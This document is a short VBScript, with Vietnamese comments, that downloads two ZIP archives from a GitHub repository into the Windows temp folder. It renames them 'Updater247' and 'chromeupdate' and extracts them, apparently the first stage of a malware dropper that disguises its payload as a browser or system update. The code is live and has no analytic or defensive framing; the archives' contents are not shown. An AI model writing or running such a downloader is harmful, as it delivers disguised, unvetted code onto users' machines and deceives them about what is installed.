Dim http, url1, url2, tempFolder, zip1, zip2
Dim shell, fso, stream

' URL của các file ZIP
url1 = "https://github.com/2UY5/1/raw/refs/heads/main/PyEnv1.zip"
url2 = "https://github.com/2UY5/1/raw/refs/heads/main/PyEnv2.zip"

' Lấy thư mục Temp thật của hệ thống
Set shell = CreateObject("WScript.Shell")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%") & "\"

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("Shell.Application")

' =============================
' Hàm tải file ZIP và đổi tên
Function DownloadFile(url, savePath)
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", url, False
    http.Send
    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1 ' Binary
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile savePath, 2
        stream.Close
        DownloadFile = True
    Else
        MsgBox "Lỗi tải file: " & url
        DownloadFile = False
    End If
End Function

' =============================
' Hàm giải nén vào thư mục cùng tên
Sub ExtractZip(zipPath, targetFolder)
    ' Nếu thư mục tồn tại thì xóa trước
    If fso.FolderExists(targetFolder) Then
        fso.DeleteFolder targetFolder, True
    End If
    fso.CreateFolder targetFolder
    
    ' Giải nén
    Set zipFile = shell.Namespace(zipPath)
    Set outFolder = shell.Namespace(targetFolder)
    If Not zipFile Is Nothing And Not outFolder Is Nothing Then
        outFolder.CopyHere zipFile.Items, 4
    End If
End Sub

' =============================
' Xử lý PyEnv1.zip
zip1 = tempFolder & "Updater247.zip"
If DownloadFile(url1, zip1) Then
    ExtractZip zip1, tempFolder & "Updater247"
End If

' =============================
' Xử lý PyEnv2.zip
zip2 = tempFolder & "chromeupdate.zip"
If DownloadFile(url2, zip2) Then
    ExtractZip zip2, tempFolder & "chromeupdate"
End If


